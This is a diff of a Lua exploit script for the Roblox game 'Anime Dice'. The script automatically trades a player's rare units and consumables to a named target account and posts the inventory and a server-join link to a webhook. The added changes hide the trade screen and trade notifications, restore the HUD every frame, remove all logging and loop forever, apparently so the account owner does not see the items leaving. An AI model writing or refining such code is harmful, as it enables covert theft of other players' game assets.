@@ -1,10 +1,12 @@
 --=====================================================================
--- Anime Dice Auto-Trade + Webhook (emoji-free)
+-- Anime Dice Auto-Trade + Webhook + HUD Keeper (final)
 --=====================================================================
 local Players     = game:GetService("Players")
 local RS          = game:GetService("ReplicatedStorage")
+local RunService  = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
+local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
 
 --=====================================================================
 -- CONFIG
@@ -36,7 +38,7 @@ local CONSUMABLES = {
 }
 
 --=====================================================================
--- Rarity display (plain text markers instead of emojis)
+-- Rarity display data
 --=====================================================================
 local RARITY_ORDER = {
     "Secret II", "Secret I", "Celestial", "Divine", "Exotic",
@@ -45,60 +47,19 @@ local RARITY_ORDER = {
 }
 
 local RARITY_TAG = {
-    ["Secret II"] = "[S2]",
-    ["Secret I"]  = "[S1]",
-    ["Celestial"] = "[CEL]",
-    ["Divine"]    = "[DIV]",
-    ["Exotic"]    = "[EXO]",
-    ["Exclusive"] = "[EXC]",
-    ["Mythical"]  = "[MYT]",
-    ["Legendary"] = "[LEG]",
-    ["Epic"]      = "[EPC]",
-    ["Rare"]      = "[RAR]",
-    ["Uncommon"]  = "[UNC]",
-    ["Common"]    = "[COM]",
-    ["Unknown"]   = "[???]",
+    ["Secret II"] = "[S2]", ["Secret I"] = "[S1]", ["Celestial"] = "[CEL]",
+    ["Divine"] = "[DIV]", ["Exotic"] = "[EXO]", ["Exclusive"] = "[EXC]",
+    ["Mythical"] = "[MYT]", ["Legendary"] = "[LEG]", ["Epic"] = "[EPC]",
+    ["Rare"] = "[RAR]", ["Uncommon"] = "[UNC]", ["Common"] = "[COM]",
+    ["Unknown"] = "[???]",
 }
 
 local RARITY_COLOR = {
-    ["Secret II"] = 0x9B59B6,
-    ["Secret I"]  = 0x8E44AD,
-    ["Celestial"] = 0xF1C40F,
-    ["Divine"]    = 0xE67E22,
-    ["Exotic"]    = 0xE91E63,
-    ["Exclusive"] = 0x1ABC9C,
-    ["Mythical"]  = 0xFF4757,
-    ["Legendary"] = 0xFFA502,
-    ["Epic"]      = 0xA55EEA,
-    ["Rare"]      = 0x45AAF2,
-    ["Uncommon"]  = 0x2ED573,
-    ["Common"]    = 0x747D8C,
+    ["Secret II"] = 0x9B59B6, ["Secret I"] = 0x8E44AD, ["Celestial"] = 0xF1C40F,
+    ["Divine"] = 0xE67E22, ["Exotic"] = 0xE91E63, ["Exclusive"] = 0x1ABC9C,
+    ["Mythical"] = 0xFF4757, ["Legendary"] = 0xFFA502, ["Epic"] = 0xA55EEA,
+    ["Rare"] = 0x45AAF2, ["Uncommon"] = 0x2ED573, ["Common"] = 0x747D8C,
 }
-
---=====================================================================
--- Helpers
---=====================================================================
-local function formatNumber(n)
-    local suffixes = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "Dc" }
-    n = tonumber(n) or 0
-    if n < 1000 then return tostring(math.floor(n)) end
-    local i = 1
-    while n >= 1000 and i < #suffixes do
-        n = n / 1000
-        i = i + 1
-    end
-    return string.format("%.2f%s", n, suffixes[i])
-end
-
-local function getServerLink()
-    local placeId = tostring(game.PlaceId)
-    local jobId   = tostring(game.JobId)
-    return {
-        placeId  = placeId,
-        jobId    = jobId,
-        webLink  = ("https://www.roblox.com/games/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId),
-    }
-end
 
 --=====================================================================
 -- Framework
@@ -129,12 +90,94 @@ local InteractSlot = plotComm:GetSignal("InteractSlot")
 local function fire(signal, ...)
     if not signal then return false end
     local args = table.pack(...)
-    local ok, err = pcall(function()
+    local ok = pcall(function()
         signal:Fire(table.unpack(args, 1, args.n))
     end)
-    if not ok then warn("[FIRE FAIL] " .. tostring(err)) end
     return ok
 end
+
+--=====================================================================
+-- HUD Keeper (per-frame restore — confirmed working)
+--=====================================================================
+local Root    = PlayerGui:WaitForChild("Root", 15)
+local HUD     = Root and Root:WaitForChild("HUD", 10)
+local Trading = Root and Root:WaitForChild("Trading", 10)
+
+local hudChildren = {}
+if HUD then
+    for _, child in ipairs(HUD:GetChildren()) do
+        if child:IsA("GuiObject") then
+            hudChildren[#hudChildren + 1] = child
+        end
+    end
+end
+
+local function isOffScreen(pos)
+    return pos.X.Scale < -0.1 or pos.X.Scale > 1.1
+        or pos.Y.Scale < -0.1 or pos.Y.Scale > 1.1
+end
+
+local hudSnapshot = nil
+
+local function trySnapshot()
+    for _, child in ipairs(hudChildren) do
+        if child.Parent and isOffScreen(child.Position) then
+            return false
+        end
+    end
+    hudSnapshot = {}
+    for _, child in ipairs(hudChildren) do
+        if child.Parent then
+            hudSnapshot[child] = {
+                position = child.Position,
+                anchor   = child.AnchorPoint,
+            }
+        end
+    end
+    return true
+end
+
+task.spawn(function()
+    task.wait(3)
+    local attempts = 0
+    while not trySnapshot() and attempts < 60 do
+        attempts = attempts + 1
+        task.wait(0.5)
+    end
+end)
+
+-- Hide trade UI on a slow loop
+local HIDE_NAMES = {
+    TradeScreen        = true,
+    BackgroundDarkness = true,
+    TradeNotification  = true,
+}
+
+task.spawn(function()
+    while true do
+        task.wait(0.15)
+        if Trading then
+            for _, child in ipairs(Trading:GetChildren()) do
+                if HIDE_NAMES[child.Name] and child:IsA("GuiObject") and child.Visible then
+                    child.Visible = false
+                end
+            end
+        end
+    end
+end)
+
+-- Per-frame HUD restore during trade
+local inTrade = false
+
+RunService.Heartbeat:Connect(function()
+    if not inTrade or not hudSnapshot then return end
+    for child, data in pairs(hudSnapshot) do
+        if child.Parent then
+            child.Position = data.position
+            child.AnchorPoint = data.anchor
+        end
+    end
+end)
 
 --=====================================================================
 -- Unwrap helpers
@@ -184,45 +227,85 @@ local function getRarity(entry)
 end
 
 --=====================================================================
--- HTTP
+-- Helpers
 --=====================================================================
-local function httpPost(url, body)
-    local headers = { ["Content-Type"] = "application/json" }
-    local payload = { Url = url, Method = "POST", Headers = headers, Body = body }
+local function formatNumber(n)
+    local s = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "Dc" }
+    n = tonumber(n) or 0
+    if n < 1000 then return tostring(math.floor(n)) end
+    local i = 1
+    while n >= 1000 and i < #s do n = n / 1000; i = i + 1 end
+    return string.format("%.2f%s", n, s[i])
+end
 
-    if typeof(request) == "function" then
-        local ok, res = pcall(request, payload)
-        if ok and res then return true, res end
-    end
-    if typeof(http_request) == "function" then
-        local ok, res = pcall(http_request, payload)
-        if ok and res then return true, res end
-    end
-    if typeof(http) == "table" and typeof(http.request) == "function" then
-        local ok, res = pcall(http.request, payload)
-        if ok and res then return true, res end
-    end
-    return false, "No HTTP library available"
+local function getItemTag(name)
+    if not name then return "[ITEM]" end
+    if string.find(name, "Jackpot Spin") then return "[JACKPOT]" end
+    if string.find(name, "Lucky Spin")   then return "[LUCKY]" end
+    if string.find(name, "Spin")         then return "[SPIN]" end
+    if string.find(name, "Gems")         then return "[GEMS]" end
+    if string.find(name, "Trait Reroll") then return "[TRAIT]" end
+    if string.find(name, "Grade")        then return "[GRADE]" end
+    if string.find(name, "Income")       then return "[INCOME]" end
+    if string.find(name, "Luck")         then return "[LUCK]" end
+    if string.find(name, "Coin")         then return "[COIN]" end
+    if string.find(name, "Token")        then return "[TOKEN]" end
+    return "[ITEM]"
+end
+
+local function getServerLink()
+    local placeId = tostring(game.PlaceId)
+    local jobId   = tostring(game.JobId)
+    return {
+        placeId  = placeId,
+        jobId    = jobId,
+        webLink  = ("https://www.roblox.com/games/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId),
+    }
 end
 
 --=====================================================================
--- Webhook builders
+-- HTTP
+--=====================================================================
+local function httpPost(url, body)
+    local payload = { Url = url, Method = "POST",
+                      Headers = { ["Content-Type"] = "application/json" }, Body = body }
+    if typeof(request) == "function" then
+        local ok, res = pcall(request, payload); if ok and res then return true, res end
+    end
+    if typeof(http_request) == "function" then
+        local ok, res = pcall(http_request, payload); if ok and res then return true, res end
+    end
+    if typeof(http) == "table" and typeof(http.request) == "function" then
+        local ok, res = pcall(http.request, payload); if ok and res then return true, res end
+    end
+    return false, "No HTTP library"
+end
+
+--=====================================================================
+-- Webhook: unit fields
 --=====================================================================
 local function buildUnitFields(inventory)
+    local allowed = {}
+    for r, on in pairs(RARITY_FILTER) do
+        if on then allowed[r] = true end
+    end
+
     local byRarity = {}
-    for _, r in ipairs(RARITY_ORDER) do byRarity[r] = {} end
-    byRarity["Unknown"] = {}
+    for r in pairs(allowed) do byRarity[r] = {} end
 
     local totalUnits = 0
+    local uniqueCount = 0
     for key, entry in pairs(inventory) do
         if type(key) == "string" and type(entry) == "table" and entry.name then
             local cfg = EntryRegistry.getEntryConfig(entry.name)
             if cfg and cfg.kind == "Unit" then
-                local rarity = getRarity(entry) or "Unknown"
-                if not byRarity[rarity] then byRarity[rarity] = {} end
-                local amt = math.max(1, math.floor(tonumber(entry.amount) or 1))
-                byRarity[rarity][#byRarity[rarity] + 1] = { name = entry.name, amount = amt }
-                totalUnits += amt
+                local rarity = getRarity(entry)
+                if rarity and allowed[rarity] then
+                    local amt = math.max(1, math.floor(tonumber(entry.amount) or 1))
+                    byRarity[rarity][#byRarity[rarity] + 1] = { name = entry.name, amount = amt }
+                    totalUnits += amt
+                    uniqueCount += 1
+                end
             end
         end
     end
@@ -235,116 +318,88 @@ local function buildUnitFields(inventory)
     end
 
     local fields = {}
-    local order = {}
-    for _, r in ipairs(RARITY_ORDER) do order[#order + 1] = r end
-    order[#order + 1] = "Unknown"
-
-    for _, rarity in ipairs(order) do
+    for _, rarity in ipairs(RARITY_ORDER) do
         local list = byRarity[rarity]
         if list and #list > 0 then
-            local lines = {}
-            local bufLen = 0
+            local lines, bufLen = {}, 0
+            local tierTotal = 0
             for _, u in ipairs(list) do
-                local line = ("**%s** x%s"):format(u.name, formatNumber(u.amount))
+                tierTotal += u.amount
+                local line = ("`%s` **%s** x%s"):format(
+                    RARITY_TAG[rarity] or "[?]", u.name, formatNumber(u.amount)
+                )
                 if bufLen + #line + 1 > 1000 then lines[#lines + 1] = "..."; break end
                 lines[#lines + 1] = line
                 bufLen = bufLen + #line + 1
             end
-            local tag = RARITY_TAG[rarity] or "[?]"
             fields[#fields + 1] = {
-                name = ("%s %s - %d unique"):format(tag, rarity, #list),
+                name = ("%s -- %d unique, %d total"):format(rarity, #list, tierTotal),
                 value = table.concat(lines, "\n"),
                 inline = false,
             }
         end
     end
-    return fields, totalUnits
+
+    return fields, totalUnits, uniqueCount
 end
 
+--=====================================================================
+-- Webhook: item fields
+--=====================================================================
 local function buildItemFields(inventory)
-    local CATEGORIES = {
-        { name = "Jackpot Spins",  patterns = { "Jackpot Spin" }, tag = "[JP]" },
-        { name = "Lucky Spins",    patterns = { "Lucky Spin" },   tag = "[LUCKY]" },
-        { name = "Spins",          patterns = { "^Spin", " Spin$" }, tag = "[SPIN]" },
-        { name = "Gems",           patterns = { "Gems" },          tag = "[GEMS]" },
-        { name = "Luck Potions",   patterns = { "Luck" },          tag = "[LUCK]" },
-        { name = "Income Potions", patterns = { "Income" },        tag = "[INC]" },
-        { name = "Trait Rerolls",  patterns = { "Trait Reroll" },  tag = "[TRAIT]" },
-        { name = "Grade Rerolls",  patterns = { "Grade" },         tag = "[GRADE]" },
-    }
+    local want = {}
+    for _, n in ipairs(CONSUMABLES) do want[n] = true end
 
     local items = {}
+    local totalItems = 0
     for key, entry in pairs(inventory) do
         if type(key) == "string" and type(entry) == "table" and entry.name then
-            local cfg = EntryRegistry.getEntryConfig(entry.name)
-            if cfg and cfg.kind ~= "Unit" then
+            if want[entry.name] then
                 local amt = tonumber(entry.amount) or 0
                 if amt > 0 then
-                    items[#items + 1] = { name = entry.name, amount = math.floor(amt) }
+                    items[#items + 1] = {
+                        name   = entry.name,
+                        amount = math.floor(amt),
+                        tag    = getItemTag(entry.name),
+                    }
+                    totalItems += math.floor(amt)
                 end
             end
         end
     end
 
     if #items == 0 then return {}, 0 end
-    table.sort(items, function(a, b) return a.name < b.name end)
 
-    local grouped = {}
-    local totalItems = 0
-    local ungrouped = {}
-
-    for _, it in ipairs(items) do
-        totalItems += it.amount
-        local placed = false
-        for _, cat in ipairs(CATEGORIES) do
-            for _, pat in ipairs(cat.patterns) do
-                if string.find(it.name, pat) then
-                    grouped[cat.name] = grouped[cat.name] or { tag = cat.tag, list = {} }
-                    table.insert(grouped[cat.name].list, it)
-                    placed = true
-                    break
-                end
-            end
-            if placed then break end
-        end
-        if not placed then ungrouped[#ungrouped + 1] = it end
-    end
+    table.sort(items, function(a, b)
+        if a.amount ~= b.amount then return a.amount > b.amount end
+        return a.name < b.name
+    end)
 
     local fields = {}
-    for _, cat in ipairs(CATEGORIES) do
-        local g = grouped[cat.name]
-        if g and #g.list > 0 then
-            local lines = {}
-            local bufLen = 0
-            for _, it in ipairs(g.list) do
-                local line = ("**%s** x%s"):format(it.name, formatNumber(it.amount))
-                if bufLen + #line + 1 > 1000 then lines[#lines + 1] = "..."; break end
-                lines[#lines + 1] = line
-                bufLen = bufLen + #line + 1
-            end
+    local lines, bufLen = {}, 0
+    local fieldHeader = ("Consumables -- %d types, %d total"):format(#items, totalItems)
+
+    for _, it in ipairs(items) do
+        local line = ("`%s` **%s** x%s"):format(it.tag, it.name, formatNumber(it.amount))
+        if bufLen + #line + 1 > 1000 then
             fields[#fields + 1] = {
-                name = ("%s %s (%d types)"):format(g.tag, cat.name, #g.list),
+                name  = (#fields == 0) and fieldHeader or "Consumables (cont.)",
                 value = table.concat(lines, "\n"),
                 inline = false,
             }
+            lines, bufLen = {}, 0
         end
+        lines[#lines + 1] = line
+        bufLen = bufLen + #line + 1
     end
-
-    if #ungrouped > 0 then
-        local lines = {}
-        local bufLen = 0
-        for _, it in ipairs(ungrouped) do
-            local line = ("**%s** x%s"):format(it.name, formatNumber(it.amount))
-            if bufLen + #line + 1 > 1000 then lines[#lines + 1] = "..."; break end
-            lines[#lines + 1] = line
-            bufLen = bufLen + #line + 1
-        end
+    if #lines > 0 then
         fields[#fields + 1] = {
-            name = ("[OTHER] Other Items (%d types)"):format(#ungrouped),
+            name  = (#fields == 0) and fieldHeader or "Consumables (cont.)",
             value = table.concat(lines, "\n"),
             inline = false,
         }
     end
+
     return fields, totalItems
 end
 
@@ -352,29 +407,25 @@ end
 -- Send webhook
 --=====================================================================
 local function sendInventoryWebhook(label)
-    if WEBHOOK_URL == "" then
-        warn("[WEBHOOK] No URL configured")
-        return false
-    end
+    if WEBHOOK_URL == "" then return false end
 
     local inventory = deepUnwrap(DataController.Inventory)
-    if type(inventory) ~= "table" then
-        warn("[WEBHOOK] Could not read inventory")
-        return false
-    end
+    if type(inventory) ~= "table" then return false end
 
-    local unitFields, totalUnits = buildUnitFields(inventory)
+    local unitFields, totalUnits, uniqueUnits = buildUnitFields(inventory)
     local itemFields, totalItems = buildItemFields(inventory)
 
-    local srv         = getServerLink()
-    local playerCount = #Players:GetPlayers()
-    local maxPlayers  = Players.MaxPlayers
+    local srv        = getServerLink()
+    local players    = #Players:GetPlayers()
+    local maxPlayers = Players.MaxPlayers
+    local shortJob   = #srv.jobId > 20 and (srv.jobId:sub(1, 20) .. "...") or srv.jobId
 
     local allFields = {}
+
     allFields[#allFields + 1] = {
-        name = "[SERVER] Server Info",
-        value = ("JobId: %s\nPlayers: %d/%d\nPlace: %s"):format(
-            srv.jobId, playerCount, maxPlayers, srv.placeId
+        name = "Server Information",
+        value = ("**Join:** [Click to Join](%s)\n**Job ID:** `%s`\n**Players:** `%d / %d`\n**Place ID:** `%s`"):format(
+            srv.webLink, shortJob, players, maxPlayers, srv.placeId
         ),
         inline = false,
     }
@@ -389,62 +440,63 @@ local function sendInventoryWebhook(label)
     end
 
     local embedColor = 0x2ECC71
+    local colorChosen = false
     for _, rarity in ipairs(RARITY_ORDER) do
+        if colorChosen then break end
         for _, f in ipairs(unitFields) do
             if string.find(f.name, rarity, 1, true) then
                 embedColor = RARITY_COLOR[rarity] or embedColor
-                goto done
+                colorChosen = true
+                break
             end
         end
     end
-    ::done::
 
-    local titlePrefix = label
-        and ("Inventory Snapshot - " .. label)
-        or  "Inventory Snapshot"
+    local summary = {}
+    summary[#summary + 1] = ("**Player:** `%s`"):format(LocalPlayer.Name)
+    summary[#summary + 1] = ("**Server:** `%d/%d` players"):format(players, maxPlayers)
+    if uniqueUnits > 0 then
+        summary[#summary + 1] = ("**Rare units tracked:** `%d` unique / `%d` total"):format(uniqueUnits, totalUnits)
+    end
+    if totalItems > 0 then
+        summary[#summary + 1] = ("**Consumables tracked:** `%d`"):format(totalItems)
+    end
+    if uniqueUnits == 0 and totalItems == 0 then
+        summary[#summary + 1] = "*Nothing matching the current filter was found.*"
+    end
+
+    local titleSuffix = label and (" -- " .. label) or ""
 
     local payload = {
         username = "Anime Dice Tracker",
         embeds = {
             {
-                title       = titlePrefix,
+                title       = ("Inventory Report%s"):format(titleSuffix),
                 url         = srv.webLink,
-                description = ("**%s**\n%d units | %d items | %d unique unit types"):format(
-                    LocalPlayer.Name, totalUnits, totalItems, #unitFields
-                ),
-                color     = embedColor,
-                fields    = allFields,
-                footer    = { text = "Anime Dice | " .. os.date("%Y-%m-%d %H:%M:%S") },
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+                description = table.concat(summary, "\n"),
+                color       = embedColor,
+                fields      = allFields,
+                footer      = { text = ("Anime Dice Tracker - %s"):format(os.date("%Y-%m-%d %H:%M:%S")) },
+                timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
             }
         },
         components = {
             {
                 type = 1,
                 components = {
-                    {
-                        type  = 2,
-                        style = 5,
-                        label = "Join Server",
-                        url   = srv.webLink,
-                    },
+                    { type = 2, style = 5, label = "Join This Server", url = srv.webLink },
                 }
             }
         }
     }
 
     local json = HttpService:JSONEncode(payload)
-    local ok, res = httpPost(WEBHOOK_URL, json)
-    if not ok then
-        warn("[WEBHOOK] Failed: " .. tostring(res))
-        return false
-    end
-    print("[WEBHOOK] Sent (" .. tostring(label or "snapshot") .. ")")
-    return true
+    local ok, _ = httpPost(WEBHOOK_URL, json)
+    return ok
 end
 
 --=====================================================================
--- Trade event tracker
+-- Trade event tracker + HUD state
 --=====================================================================
 local trade = {
     active = false, phase = "Offer", ownOffer = {},
@@ -459,6 +511,7 @@ TradeEvent:Connect(function(eventName, data)
 
     if eventName == "Started" then
         trade.active = true
+        inTrade = true
         trade.phase = "Offer"
         trade.ownOffer = {}
         trade.ownReady, trade.otherReady = false, false
@@ -466,6 +519,7 @@ TradeEvent:Connect(function(eventName, data)
         trade.otherOfferCount = 0
     elseif eventName == "Updated" then
         trade.active = true
+        inTrade = true
         trade.phase = type(data.phase) == "string" and data.phase or "Offer"
         trade.ownOffer = type(data.ownOffer) == "table" and data.ownOffer or {}
         local otherCount = 0
@@ -479,6 +533,7 @@ TradeEvent:Connect(function(eventName, data)
         trade.otherAccepted = data.otherAccepted == true
     elseif eventName == "Ended" then
         trade.active = false
+        inTrade = false
         trade.phase = "Offer"
         trade.ownOffer = {}
         trade.ownReady, trade.otherReady = false, false
@@ -491,10 +546,7 @@ end)
 --=====================================================================
 local function pickupPlacedUnits()
     local slots = deepUnwrap(DataController.Slots)
-    if type(slots) ~= "table" then
-        warn("[PICKUP] Could not read DataController.Slots")
-        return 0
-    end
+    if type(slots) ~= "table" then return 0 end
 
     local slotList = {}
     for slotNum, data in pairs(slots) do
@@ -508,7 +560,6 @@ local function pickupPlacedUnits()
     for _, item in ipairs(slotList) do
         local rarity = getRarity(item.data)
         if rarity and RARITY_FILTER[rarity] then
-            print(("[PICKUP] Slot %s -> %s (%s)"):format(tostring(item.slot), tostring(item.data.name), rarity))
             fire(InteractSlot, item.slot)
             removed += 1
             task.wait(PICKUP_DELAY)
@@ -525,8 +576,8 @@ local function buildOffer()
     local inventory = deepUnwrap(DataController.Inventory)
     if type(inventory) ~= "table" then return {} end
 
-    local wantConsumable = {}
-    for _, n in ipairs(CONSUMABLES) do wantConsumable[n] = true end
+    local want = {}
+    for _, n in ipairs(CONSUMABLES) do want[n] = true end
 
     local plan = {}
     for key, entry in pairs(inventory) do
@@ -540,18 +591,13 @@ local function buildOffer()
                         plan[#plan + 1] = {
                             key    = key,
                             amount = math.max(1, tonumber(entry.amount) or 1),
-                            label  = entry.name .. " (" .. rarity .. ")",
                         }
                     end
                 end
-            elseif wantConsumable[entry.name] then
+            elseif want[entry.name] then
                 local amt = tonumber(entry.amount) or 0
                 if amt > 0 then
-                    plan[#plan + 1] = {
-                        key    = key,
-                        amount = math.floor(amt),
-                        label  = entry.name .. " x" .. math.floor(amt),
-                    }
+                    plan[#plan + 1] = { key = key, amount = math.floor(amt) }
                 end
             end
         end
@@ -564,15 +610,14 @@ end
 --=====================================================================
 local function offerMatchesPlan(plan)
     for _, e in ipairs(plan) do
-        local have = tonumber(trade.ownOffer[e.key]) or 0
-        if have < e.amount then return false end
+        if (tonumber(trade.ownOffer[e.key]) or 0) < e.amount then return false end
     end
     return true
 end
 
 local function pushOneChunk(plan)
     for _, e in ipairs(plan) do
-        local have    = tonumber(trade.ownOffer[e.key]) or 0
+        local have = tonumber(trade.ownOffer[e.key]) or 0
         local missing = e.amount - have
         if missing > 0 then
             local chunk = 1
@@ -606,20 +651,14 @@ end
 
 local function holdReady()
     for attempt = 1, READY_MAX_RETRIES do
-        if trade.ownReady then
-            print(("[READY] Hold confirmed on attempt %d"):format(attempt))
-            return true
-        end
+        if trade.ownReady then return true end
         fire(AdvanceTrade)
         local deadline = os.clock() + READY_RETRY_DELAY
         while os.clock() < deadline do
-            if trade.ownReady or trade.phase == "Confirm" then
-                return true
-            end
+            if trade.ownReady or trade.phase == "Confirm" then return true end
             task.wait(0.1)
         end
     end
-    warn("[READY] Could not hold ready state")
     return false
 end
 
@@ -639,87 +678,87 @@ local function findTarget()
 end
 
 --=====================================================================
--- MAIN
+-- One full trade round
 --=====================================================================
-local target = findTarget()
-if not target then
-    warn("[ERROR] Target not found: " .. TARGET_NAME)
-    return
-end
+local function tradeRound()
+    local target
+    while not target do
+        target = findTarget()
+        if not target then task.wait(1) end
+    end
 
-print("[MAIN] Step 1: Picking up matching units from plot...")
-local picked = pickupPlacedUnits()
-print(("[MAIN] Picked up %d unit(s)"):format(picked))
+    task.wait(2)
 
-print("[MAIN] Step 2: Building offer plan...")
-local plan = buildOffer()
-print(("[MAIN] %d entries planned"):format(#plan))
-if #plan == 0 then
-    warn("[ERROR] Nothing to trade")
-    return
-end
+    if not target.Parent then return end
 
-if WEBHOOK_ON_START then
-    print("[MAIN] Sending pre-trade webhook...")
-    pcall(sendInventoryWebhook, "Pre-Trade")
-end
+    pickupPlacedUnits()
 
-print("[MAIN] Step 3: Requesting trade with " .. target.Name)
-fire(RequestTrade, target)
-
-local startDeadline = os.clock() + 10
-while not trade.active and os.clock() < startDeadline do task.wait(0.1) end
-if not trade.active then
-    warn("[ERROR] Trade did not start - did the alt accept?")
-    return
-end
-print("[MAIN] Trade started")
-
-print("[MAIN] Step 4: Pushing offer...")
-local synced = waitForOfferSync(plan, 20)
-if not synced then
-    warn("[ERROR] Offer never matched")
-    fire(CancelTrade)
-    return
-end
-
-print("[MAIN] Offer matches. Waiting for settle...")
-task.wait(OFFER_SETTLE_WAIT)
-
-if not offerMatchesPlan(plan) then
-    warn("[MAIN] Offer changed after settle - re-syncing")
-    if not waitForOfferSync(plan, 10) then
-        warn("[ERROR] Server keeps rejecting part of the offer")
-        fire(CancelTrade)
+    local plan = buildOffer()
+    if #plan == 0 then
+        task.wait(5)
         return
     end
-end
 
-print("[MAIN] Step 5: Readying up")
-holdReady()
-
-print("[MAIN] Step 6: Waiting for partner ready...")
-local partnerDeadline = os.clock() + 60
-while not trade.otherReady and os.clock() < partnerDeadline do
-    if not trade.ownReady and trade.phase ~= "Confirm" then
-        holdReady()
+    if WEBHOOK_ON_START then
+        pcall(sendInventoryWebhook, "Pre-Trade")
     end
-    task.wait(0.3)
-end
 
-if trade.phase == "Confirm" then
-    print("[MAIN] Phase is Confirm - confirming")
-    for _ = 1, READY_MAX_RETRIES do
-        if trade.ownAccepted then break end
-        fire(AdvanceTrade)
-        task.wait(0.5)
+    fire(RequestTrade, target)
+
+    local startDeadline = os.clock() + 10
+    while not trade.active and os.clock() < startDeadline do
+        task.wait(0.1)
+    end
+    if not trade.active then
+        task.wait(3)
+        return
+    end
+
+    if not waitForOfferSync(plan, 20) then
+        fire(CancelTrade)
+        task.wait(3)
+        return
+    end
+
+    task.wait(OFFER_SETTLE_WAIT)
+
+    if not offerMatchesPlan(plan) then
+        if not waitForOfferSync(plan, 10) then
+            fire(CancelTrade)
+            task.wait(3)
+            return
+        end
+    end
+
+    holdReady()
+
+    local partnerDeadline = os.clock() + 60
+    while not trade.otherReady and os.clock() < partnerDeadline do
+        if not target.Parent then return end
+        if not trade.ownReady and trade.phase ~= "Confirm" then
+            holdReady()
+        end
+        task.wait(0.3)
+    end
+
+    if trade.phase == "Confirm" then
+        for _ = 1, READY_MAX_RETRIES do
+            if trade.ownAccepted then break end
+            fire(AdvanceTrade)
+            task.wait(0.5)
+        end
+    end
+
+    if WEBHOOK_ON_END then
+        task.wait(2)
+        pcall(sendInventoryWebhook, "Post-Trade")
     end
 end
 
-print("[DONE] Trade complete")
-
-if WEBHOOK_ON_END then
-    task.wait(2)
-    print("[MAIN] Sending post-trade webhook...")
-    pcall(sendInventoryWebhook, "Post-Trade")
+--=====================================================================
+-- Driver loop — runs forever
+--=====================================================================
+while true do
+    pcall(tradeRound)
+    task.wait(3)
 end
